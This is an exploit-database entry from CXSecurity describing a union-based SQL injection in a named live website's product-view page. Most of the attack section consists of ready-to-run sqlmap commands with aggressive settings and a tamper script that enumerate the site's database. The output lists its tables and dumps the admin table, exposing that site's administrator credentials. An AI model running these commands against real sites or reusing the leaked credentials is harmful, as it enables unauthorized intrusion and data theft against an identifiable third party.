---
title: TheDotStudios Web Application Union-based Sql Injection
url: https://cxsecurity.com/issue/WLB-2025010015
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2025-01-15
fetch_date: 2025-10-06T20:04:49.932976
---

# TheDotStudios Web Application Union-based Sql Injection

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **TheDotStudios Web Application Union-based Sql Injection** **2025.01.14**  **![ir](https://cert.cx/cxstatic/images/flags/ir.png) [Razi](https://cxsecurity.com/author/Razi/1/) **(IR)** ![ir](https://cert.cx/cxstatic/images/flags/ir.png)**  Risk: **Low**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **N/A** | |

# Exploit Title: TheDotStudios Web Application Union-based Sql Injection
# Date: 2025-01-04
# Exploit Author: Parastou Razi
# Contact: razi.parastoo@gmail.com
#Category:webapps
#Tested On: Windows, Firefox
Proof of Concept:
1. Description:
When an application is vulnerable to SQL injection, and the results of the query are returned within the application's responses, you can use the UNION keyword to retrieve data from other tables within the database. This is commonly known as a SQL injection UNION attack.
Union-based SQLi – the attacker uses the UNION operator to combine a benign SQL statement with a malicious statement. The malicious statement must use the same columns and data types as the original statement. A vulnerable database processes the combined statement and executes the malicious code.
[+] For UNION-Based Sql Injection first add "'" to the end of the link and page information will change :
https://thangam5g.com/product-view.php?id=20
https://thangam5g.com/product-view.php?id=20'
2. Proof
#Demo 1:
sudo sqlmap -u https://thangam5g.com/product-view.php?id=20 -p id --random-agent --level=5 --risk=3 --force-ssl --ignore-code=500 dbms=MySQL -tamper=space2comment
--forms --batch --crawl=10 --threads=10 --answers="follow=Y" -D u915722082\_thangam\_db --tables
sudo sqlmap -u https://thangam5g.com/product-view.php?id=20 -p id --random-agent --level=5 --risk=3 --force-ssl --ignore-code=500 dbms=MySQL -tamper=space2comment --crawl=10 --threads=10 --answers="follow=Y" -D u915722082\_thangam\_db --tables
| tbl\_admin |
| tbl\_category |
| tbl\_category2 |
| tbl\_category3 |
| tbl\_images |
| tbl\_meeting |
| tbl\_products |
| tbl\_quote |
| tbl\_review
sudo sqlmap -u https://thangam5g.com/product-view.php?id=20 -p id --random-agent --level=5 --risk=3 --force-ssl --ignore-code=500 dbms=MySQL -tamper=space2comment --crawl=10 --threads=10 --answers="follow=Y" -D u915722082\_thangam\_db --tables -T tbl\_admin --dump
+-----+-------+-------+
| aid | aname | apass |
+-----+-------+-------+
| 1 | admin | admin |
+-----+-------+-------+

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2025010015)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top